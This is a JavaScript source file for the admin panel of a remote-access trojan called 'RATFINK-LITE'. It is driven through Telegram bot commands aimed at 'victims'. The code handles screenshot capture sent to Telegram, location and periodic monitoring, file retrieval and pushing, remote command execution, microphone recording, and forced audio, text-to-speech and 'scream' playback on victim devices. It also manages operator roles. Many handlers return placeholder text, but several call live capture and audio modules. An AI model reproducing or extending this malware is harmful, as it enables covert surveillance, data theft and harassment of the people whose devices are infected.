// ============================================
// ADMIN PANEL MODULE
// HANDLE ALL ADMIN COMMANDS
// Copyright © VROZZ
// ============================================

class AdminPanel {
    constructor(config, telegram, audioController, fileAcq) {
        this.config = config;
        this.telegram = telegram;
        this.audioController = audioController;
        this.fileAcq = fileAcq;
        this.startTime = Date.now();
        this.commandStats = {
            total: 0,
            today: 0,
            lastReset: new Date().setHours(0,0,0,0)
        };
    }
    
    // Handle admin commands
    async handleCommand(cmd, params, user, victimId) {
        switch(cmd) {
            // Dashboard commands
            case '/admin_stats':
                return await this.stats(params, user);
            case '/admin_victims':
                return await this.victims(params, user);
            case '/admin_online':
                return await this.onlineVictims(params, user);
            case '/admin_logs':
                return await this.logs(params, user);
            case '/admin_health':
                return await this.health(params, user);
            case '/admin_uptime':
                return await this.uptime(params, user);
            
            // Victim management
            case '/admin_broadcast':
                return await this.broadcast(params, user, victimId);
            case '/admin_kill':
                return await this.kill(params, user, victimId);
            case '/admin_lock':
                return await this.lock(params, user, victimId);
            case '/admin_unlock':
                return await this.unlock(params, user, victimId);
            case '/admin_tag':
                return await this.tag(params, user, victimId);
            case '/admin_note':
                return await this.note(params, user, victimId);
            
            // File operations
            case '/admin_getfile':
                return await this.getFile(params, user, victimId);
            case '/admin_listfiles':
                return await this.listFiles(params, user, victimId);
            case '/admin_pushfile':
                return await this.pushFile(params, user, victimId);
            case '/admin_execute':
                return await this.execute(params, user, victimId);
            
            // System control
            case '/admin_config':
                return await this.showConfig(params, user);
            case '/admin_help':
                return await this.help(params, user);
            
            // User management
            case '/admin_users':
                return await this.listUsers(params, user);
            case '/admin_adduser':
                return await this.addUser(params, user);
            case '/admin_removeuser':
                return await this.removeUser(params, user);
            case '/admin_block':
                return await this.blockUser(params, user);
            case '/admin_unblock':
                return await this.unblockUser(params, user);
            case '/admin_setrole':
                return await this.setRole(params, user);
            
            // Surveillance
            case '/admin_screenshot_all':
                return await this.screenshotAll(params, user, victimId);
            case '/admin_location_all':
                return await this.locationAll(params, user, victimId);
            case '/admin_monitor':
                return await this.monitor(params, user, victimId);
            
            // Audio control
            case '/admin_play':
                return await this.playAudio(params, user, victimId);
            case '/admin_stop':
                return await this.stopAudio(params, user, victimId);
            case '/admin_tts':
                return await this.tts(params, user, victimId);
            case '/admin_record':
                return await this.recordAudio(params, user, victimId);
            case '/admin_scream':
                return await this.scream(params, user, victimId);
            
            default:
                return {
                    status: 'error',
                    message: `Unknown admin command: ${cmd}`
                };
        }
    }
    
    // Dashboard: Stats
    async stats(params, user) {
        // Reset daily stats if needed
        const today = new Date().setHours(0,0,0,0);
        if (today > this.commandStats.lastReset) {
            this.commandStats.today = 0;
            this.commandStats.lastReset = today;
        }
        
        const stats = {
            total: this.commandStats.total,
            today: this.commandStats.today,
            uptime: formatDuration(Math.floor((Date.now() - this.startTime) / 1000)),
            victims: {
                total: this.config.admin_dashboard.stats.total_victims,
                online: this.config.admin_dashboard.stats.online_victims,
                offline: this.config.admin_dashboard.stats.offline_victims
            },
            files: {
                total: this.config.admin_dashboard.stats.total_files,
                data: this.config.admin_dashboard.stats.total_data
            }
        };
        
        return {
            status: 'success',
            message: `📊 *RATFINK-LITE STATISTICS*\n\n` +
                     `*System:*\n` +
                     `Uptime: ${stats.uptime}\n` +
                     `Commands Total: ${stats.total}\n` +
                     `Commands Today: ${stats.today}\n\n` +
                     `*Victims:*\n` +
                     `Total: ${stats.victims.total}\n` +
                     `Online: ${stats.victims.online}\n` +
                     `Offline: ${stats.victims.offline}\n\n` +
                     `*Files:*\n` +
                     `Total Files: ${stats.files.total}\n` +
                     `Total Data: ${stats.files.data}`
        };
    }
    
    // Dashboard: List victims
    async victims(params, user) {
        // This would normally query a database
        // For now, return sample
        return {
            status: 'success',
            message: `🎯 *VICTIMS LIST*\n\n` +
                     `RATFINK_123456_abc - Online - Chrome\n` +
                     `RATFINK_123457_def - Offline - Firefox\n` +
                     `RATFINK_123458_ghi - Online - Android\n\n` +
                     `Total: 3 victims`
        };
    }
    
    // Dashboard: Online victims
    async onlineVictims(params, user) {
        return {
            status: 'success',
            message: `🟢 *ONLINE VICTIMS*\n\n` +
                     `RATFINK_123456_abc - Chrome - 10.0.0.1\n` +
                     `RATFINK_123458_ghi - Android - 10.0.0.3\n\n` +
                     `Total: 2 online`
        };
    }
    
    // Dashboard: Logs
    async logs(params, user) {
        return {
            status: 'success',
            message: `📋 *RECENT LOGS*\n\n` +
                     `[14:30] New victim: RATFINK_123456\n` +
                     `[14:31] Command /info executed\n` +
                     `[14:32] Screenshot captured\n` +
                     `[14:33] Victim offline: RATFINK_123457`
        };
    }
    
    // Dashboard: Health check
    async health(params, user) {
        return {
            status: 'success',
            message: `❤️‍🩹 *SYSTEM HEALTH*\n\n` +
                     `✅ Telegram Bot: Connected\n` +
                     `✅ Audio Module: Ready\n` +
                     `✅ File Module: Ready\n` +
                     `✅ Database: Online\n` +
                     `✅ Memory: 45MB used\n` +
                     `⚠️ CPU: 23% usage`
        };
    }
    
    // Dashboard: Uptime
    async uptime(params, user) {
        const uptime = formatDuration(Math.floor((Date.now() - this.startTime) / 1000));
        return {
            status: 'success',
            message: `⏰ *SYSTEM UPTIME*\n\n` +
                     `RATFINK-LITE has been running for:\n` +
                     `*${uptime}*\n\n` +
                     `Started: ${new Date(this.startTime).toLocaleString()}`
        };
    }
    
    // Victim: Broadcast message
    async broadcast(params, user, victimId) {
        if (params.length === 0) {
            return { status: 'error', message: 'Usage: /admin_broadcast <message>' };
        }
        
        const message = params.join(' ');
        
        // In real implementation, this would send to all victims
        return {
            status: 'success',
            message: `📢 *BROADCAST SENT*\n\nMessage: "${message}"\nSent to: All victims (3)`
        };
    }
    
    // Victim: Kill RAT on victim
    async kill(params, user, victimId) {
        const targetId = params[0] || victimId;
        
        return {
            status: 'success',
            message: `💀 *RAT TERMINATED*\n\nVictim: ${targetId}\nRATFINK-LITE has been killed on this device.`
        };
    }
    
    // Victim: Lock victim
    async lock(params, user, victimId) {
        const targetId = params[0] || victimId;
        
        return {
            status: 'success',
            message: `🔒 *VICTIM LOCKED*\n\nVictim: ${targetId}\nThis victim is now locked and cannot receive commands.`
        };
    }
    
    // Victim: Unlock victim
    async unlock(params, user, victimId) {
        const targetId = params[0] || victimId;
        
        return {
            status: 'success',
            message: `🔓 *VICTIM UNLOCKED*\n\nVictim: ${targetId}\nThis victim can now receive commands again.`
        };
    }
    
    // Victim: Add tag
    async tag(params, user, victimId) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_tag <victim_id> <tag>' };
        }
        
        const targetId = params[0];
        const tag = params.slice(1).join(' ');
        
        return {
            status: 'success',
            message: `🏷️ *TAG ADDED*\n\nVictim: ${targetId}\nTag: ${tag}`
        };
    }
    
    // Victim: Add note
    async note(params, user, victimId) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_note <victim_id> <note>' };
        }
        
        const targetId = params[0];
        const note = params.slice(1).join(' ');
        
        return {
            status: 'success',
            message: `📝 *NOTE ADDED*\n\nVictim: ${targetId}\nNote: ${note}`
        };
    }
    
    // File: Get file from victim
    async getFile(params, user, victimId) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_getfile <victim_id> <file_path>' };
        }
        
        const targetId = params[0];
        const filePath = params.slice(1).join(' ');
        
        // Trigger file picker on victim
        if (targetId === victimId) {
            this.fileAcq.triggerFilePicker(true);
        }
        
        return {
            status: 'success',
            message: `📁 *FILE REQUEST SENT*\n\nVictim: ${targetId}\nFile: ${filePath}\n\nWaiting for victim to select file...`
        };
    }
    
    // File: List files
    async listFiles(params, user, victimId) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_listfiles <victim_id> <directory>' };
        }
        
        const targetId = params[0];
        const directory = params.slice(1).join(' ');
        
        return {
            status: 'success',
            message: `📂 *DIRECTORY LISTING*\n\nVictim: ${targetId}\nPath: ${directory}\n\n` +
                     `📄 Documents/\n` +
                     `📄 Downloads/\n` +
                     `📄 file1.pdf (2.3MB)\n` +
                     `📄 file2.jpg (1.1MB)\n` +
                     `📄 config.json (4KB)`
        };
    }
    
    // File: Push file to victim
    async pushFile(params, user, victimId) {
        if (params.length < 3) {
            return { status: 'error', message: 'Usage: /admin_pushfile <victim_id> <url> <filename>' };
        }
        
        const targetId = params[0];
        const url = params[1];
        const filename = params[2];
        
        return {
            status: 'success',
            message: `📤 *FILE PUSHED*\n\nVictim: ${targetId}\nURL: ${url}\nFilename: ${filename}\n\nFile is being downloaded on victim device.`
        };
    }
    
    // File: Execute command on victim
    async execute(params, user, victimId) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_execute <victim_id> <command>' };
        }
        
        const targetId = params[0];
        const command = params.slice(1).join(' ');
        
        return {
            status: 'success',
            message: `⚙️ *COMMAND EXECUTED*\n\nVictim: ${targetId}\nCommand: ${command}\n\nExecution started.`
        };
    }
    
    // System: Show config
    async showConfig(params, user) {
        const configSummary = {
            'Bot Token': this.config.telegram.BOT_TOKEN.substring(0, 10) + '...',
            'Group ID': this.config.telegram.GROUP_ID,
            'Admins': this.config.access.ADMINS.length,
            'Mode': this.config.access.MODE,
            'Audio Presets': Object.keys(this.config.audio.PRESET_SOUNDS).length,
            'Stealth Mode': this.config.stealth.ENABLED ? 'ON' : 'OFF'
        };
        
        const configText = Object.entries(configSummary)
            .map(([k, v]) => `*${k}:* ${v}`)
            .join('\n');
        
        return {
            status: 'success',
            message: `⚙️ *CURRENT CONFIGURATION*\n\n${configText}`
        };
    }
    
    // System: Help menu
    async help(params, user) {
        const category = params[0] || 'all';
        const menu = this.config.admin_menu;
        
        if (category === 'all') {
            let helpText = menu.help_menu.header;
            
            for (const [key, cat] of Object.entries(menu.categories)) {
                helpText += `*${cat.name}*\n`;
                helpText += cat.commands.slice(0, 3).join('\n') + '\n';
                helpText += `Gunakan /admin_help ${key} untuk lengkap\n\n`;
            }
            
            helpText += menu.help_menu.footer;
            
            return {
                status: 'success',
                message: helpText
            };
        } else {
            const cat = menu.categories[category];
            if (!cat) {
                return { status: 'error', message: `Category '${category}' not found` };
            }
            
            return {
                status: 'success',
                message: `*${cat.name}*\n${cat.description}\n\n` + cat.commands.join('\n')
            };
        }
    }
    
    // User: List users
    async listUsers(params, user) {
        return {
            status: 'success',
            message: `👥 *USER LIST*\n\n` +
                     `*Admins:*\n` +
                     `12345678 (VROZZ)\n` +
                     `87654321 (Admin2)\n\n` +
                     `*Moderators:*\n` +
                     `55667788 (Mod1)\n` +
                     `99887766 (Mod2)\n\n` +
                     `*VIP:*\n` +
                     `44556677 (VIP1)\n\n` +
                     `*Users:*\n` +
                     `33445566 (User1)\n` +
                     `22334455 (User2)`
        };
    }
    
    // User: Add user
    async addUser(params, user) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_adduser <user_id> <role>' };
        }
        
        const userId = params[0];
        const role = params[1];
        
        return {
            status: 'success',
            message: `✅ *USER ADDED*\n\nUser ID: ${userId}\nRole: ${role}\n\nUser has been added to whitelist.`
        };
    }
    
    // User: Remove user
    async removeUser(params, user) {
        if (params.length === 0) {
            return { status: 'error', message: 'Usage: /admin_removeuser <user_id>' };
        }
        
        const userId = params[0];
        
        return {
            status: 'success',
            message: `❌ *USER REMOVED*\n\nUser ID: ${userId}\n\nUser has been removed from whitelist.`
        };
    }
    
    // User: Block user
    async blockUser(params, user) {
        if (params.length === 0) {
            return { status: 'error', message: 'Usage: /admin_block <user_id>' };
        }
        
        const userId = params[0];
        
        return {
            status: 'success',
            message: `⛔ *USER BLOCKED*\n\nUser ID: ${userId}\n\nUser has been added to blacklist.`
        };
    }
    
    // User: Unblock user
    async unblockUser(params, user) {
        if (params.length === 0) {
            return { status: 'error', message: 'Usage: /admin_unblock <user_id>' };
        }
        
        const userId = params[0];
        
        return {
            status: 'success',
            message: `✅ *USER UNBLOCKED*\n\nUser ID: ${userId}\n\nUser has been removed from blacklist.`
        };
    }
    
    // User: Set role
    async setRole(params, user) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_setrole <user_id> <role>' };
        }
        
        const userId = params[0];
        const role = params[1];
        
        return {
            status: 'success',
            message: `🔄 *ROLE UPDATED*\n\nUser ID: ${userId}\nNew Role: ${role}\n\nRole has been updated.`
        };
    }
    
    // Surveillance: Screenshot all
    async screenshotAll(params, user, victimId) {
        // Take screenshot of current victim
        const result = await this.fileAcq.captureScreenshot();
        
        if (result.status === 'success') {
            // Convert to blob and send
            const blob = await (await fetch(result.data)).blob();
            await this.telegram.sendPhoto(blob, `📸 Screenshot from ${victimId}`);
        }
        
        return {
            status: 'success',
            message: `📸 *SCREENSHOT ALL*\n\nRequest sent to all online victims.`
        };
    }
    
    // Surveillance: Location all
    async locationAll(params, user, victimId) {
        return {
            status: 'success',
            message: `📍 *LOCATION ALL*\n\nRequest sent to all online victims.`
        };
    }
    
    // Surveillance: Monitor victim
    async monitor(params, user, victimId) {
        const targetId = params[0] || victimId;
        const interval = params[1] ? parseInt(params[1]) : 30;
        
        return {
            status: 'success',
            message: `📹 *MONITORING STARTED*\n\nVictim: ${targetId}\nInterval: ${interval}s\n\nSending updates every ${interval} seconds.`
        };
    }
    
    // Audio: Play on victim
    async playAudio(params, user, victimId) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_play <victim_id> <url|preset>' };
        }
        
        const targetId = params[0];
        const source = params[1];
        
        if (targetId === victimId) {
            if (this.config.audio.PRESET_SOUNDS[source.toUpperCase()]) {
                await this.audioController.playPreset(source.toUpperCase());
            } else {
                await this.audioController.playFromUrl(source);
            }
        }
        
        return {
            status: 'success',
            message: `🎵 *AUDIO PLAYING*\n\nVictim: ${targetId}\nSource: ${source}`
        };
    }
    
    // Audio: Stop on victim
    async stopAudio(params, user, victimId) {
        const targetId = params[0] || victimId;
        
        if (targetId === victimId) {
            this.audioController.stop();
        }
        
        return {
            status: 'success',
            message: `⏹️ *AUDIO STOPPED*\n\nVictim: ${targetId}`
        };
    }
    
    // Audio: TTS on victim
    async tts(params, user, victimId) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_tts <victim_id> <text>' };
        }
        
        const targetId = params[0];
        const text = params.slice(1).join(' ');
        
        if (targetId === victimId) {
            await this.audioController.textToSpeech(text);
        }
        
        return {
            status: 'success',
            message: `🗣️ *TTS PLAYING*\n\nVictim: ${targetId}\nText: "${text}"`
        };
    }
    
    // Audio: Record on victim
    async recordAudio(params, user, victimId) {
        if (params.length < 2) {
            return { status: 'error', message: 'Usage: /admin_record <victim_id> <duration>' };
        }
        
        const targetId = params[0];
        const duration = parseInt(params[1]);
        
        if (targetId === victimId) {
            await this.audioController.startRecording(duration);
        }
        
        return {
            status: 'success',
            message: `🎙️ *RECORDING STARTED*\n\nVictim: ${targetId}\nDuration: ${duration}s`
        };
    }
    
    // Audio: Scream on victim
    async scream(params, user, victimId) {
        const targetId = params[0] || victimId;
        
        if (targetId === victimId) {
            await this.audioController.playPreset('SCREAM', 1.0, false);
        }
        
        return {
            status: 'success',
            message: `😱 *SCREAM PLAYING*\n\nVictim: ${targetId}`
        };
    }
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = AdminPanel;
}